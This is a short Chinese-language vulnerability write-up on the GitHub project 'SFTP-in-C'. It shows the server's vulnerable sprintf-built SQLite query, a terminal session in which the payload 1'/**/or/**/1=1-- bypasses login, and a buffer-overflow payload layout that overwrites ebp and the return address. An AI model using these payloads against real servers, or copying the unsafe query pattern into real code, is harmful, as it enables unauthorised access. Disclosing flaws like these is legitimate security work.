# [SFTP-in-C](https://github.com/hsingh124/SFTP-in-C)

## sql注入

在/server/sftp.c文件的user函数中存在sql注入漏洞。当用户发送USER xxx命令登录ftp服务器时，sftp通过查询sqlite3数据库中的账号密码。

```c
void user(int client_fd, sqlite3 *db, sqlite3_stmt *stmt, char *message, char *buffer)
{
	char *user_id = strtok(buffer, " ");
	user_id = strtok(NULL, " ");

	char query[512];
	sprintf(query, "select id, acc, pass from users where id = '%s';", user_id);
	sqlite3_prepare_v2(db, query, -1, &stmt, 0);
```

通过users.db文件得知用户名密码。sftp通过user函数验证用户id，通过u_acct函数验证用户名，通过pass函数验证密码。make编译后`./server`启动默认监听8080

```shell
root@kali:~/桌面/SFTP-in-C-main/client# ./client 127.0.0.1 8080
+CS725 SFTP Service
USER zhao
-zhao user id not found
USER 1'/**/or/**/1=1--
+user1 ok, send account and password
acct 1'/**/or/**/1=1--
+user1 account verified, send password
pass 1'/**/or/**/1=1--
!user1 logged in
```

## 栈溢出

逆向server文件查看user函数，跟踪传入的变量，由于user_id可以为超长字符串，query缓冲区为512，所以存在栈溢出。`payload='a'*528+'b'*8+'c'*8(8个b覆盖ebp，8个c覆盖ret-减去[select id,acc,pass from users where id='';]所占字节)`



